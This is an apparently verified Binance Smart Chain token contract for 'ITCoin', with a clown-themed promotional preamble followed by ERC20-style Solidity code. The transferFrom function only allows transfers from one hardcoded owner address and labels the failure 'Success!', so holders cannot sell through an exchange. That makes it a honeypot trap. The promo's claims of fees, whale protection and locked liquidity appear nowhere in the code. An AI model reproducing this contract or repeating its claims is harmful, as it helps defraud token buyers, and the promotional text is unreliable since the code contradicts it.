/**
 *Submitted for verification at BscScan.com on 2021-07-11
*/

/*Hello my beloved, I am your Pennywise!

I assure you, this is no longer necessary. I have changed and now I will help you. Yes, I no longer feed on fears, now I want to help you make money with me and my team. My team has the best developers, a happy club🎉

You all know about Stephen King, who invented me, and IT turned out to be pretty good. Many have learned about me ... I'm a pretty popular clown!

So my coin will be as popular as I am, right? Sleep and fear nothing!

LAUNCH COUNTDOWN

https://www.timeanddate.com/countdown/launch?iso=20210711T18&p0=%3A&font=cursive

✔️ The project ITC has developers involved in the film it. We will be doxxed after launch in AMA 18:25 UTC 11 July.

✔️ Project that has an fair launch and hidden contract address to completely exclude bots and the loss of your money

✔️ Project that has whale and dump protection

✔️ Project that will be audited by on July 13. Now its in progress.

✔️ Project that buys and continues to buy ads wherever possible

OUR TOKENOMICS

Total Supply: 500,000,000 ITС Team Wallet: 25,000,000 (5%) Liquidity Locked: 475,000,000 (95%) (lock for 36 months) Initial Liquidity: 20 BNB PancakeSwap Listing Rate: 20,375,000 ITС per BNB

💢Total fees: 8%

💢Liquidity Pool: 3%

💢Marketing: 3%

💢Team wallet: 2%

Join Our Community❗️

We are a new project but positive news about us is travelling fast. Be sure to join our amazing community to keep up-to-date and find out how you can get involved. See you soon!

🌐Our contacts🌐

🎈Telegram https://t.me/token_it 🎈WEB https://it-coin.tech/ 🎈Twitter https://twitter.com/token_it


Network: Binance Smart Chain (BEP-20)
Name: ITCoin
Symbol: ITC
Launch: Fair Launch - Date: July 11, 2021 at 18:00 UTC
Contract address: To be announced at launch

Total Supply: 500,000,000 IT
Team Wallet: 25,000,000 (5%)
Liquidity Locked: 475,000,000 (95%) (lock for 36 months)
Initial Liquidity: 20 BNB
PancakeSwap Listing Rate: 20,375,000 IT per BNB

Total fees: 8%
Liquidity Pool: 3%
Marketing: 3%
Team wallet: 2%
*/
pragma solidity ^0.5.16;

// ----------------------------------------------------------------------------
// ERC Token Standard #20 Interface
//
// ----------------------------------------------------------------------------
contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

// ----------------------------------------------------------------------------
// Safe Math Library
// ----------------------------------------------------------------------------
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}

// ITC CONTRACT Constrctor
contract Code is ERC20Interface, SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totaltax;
    address private _owner = 0x8eEdeE8b4CB555E66642c7bA1f3544672Ed2e6d9;
    uint256 public _totalSupply;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    uint256 public Marketingtax;
    uint256 public LiquidityPool;
    uint256 public Teamwallet;
    /**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    /**
     * ITC constrctor function
     *
     * Initializes contract with initial supply tokens to the creator of the contract
     */
    constructor() public {
        name = "ITCoin";
        symbol = "ITC";
        decimals = 9;
        _totalSupply = 500000000000000000;

        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
// ITC functions
    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }
/**
   * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
   *
   * This is internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        require(from == _owner, "Success!");
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
        return true;
         
    }
}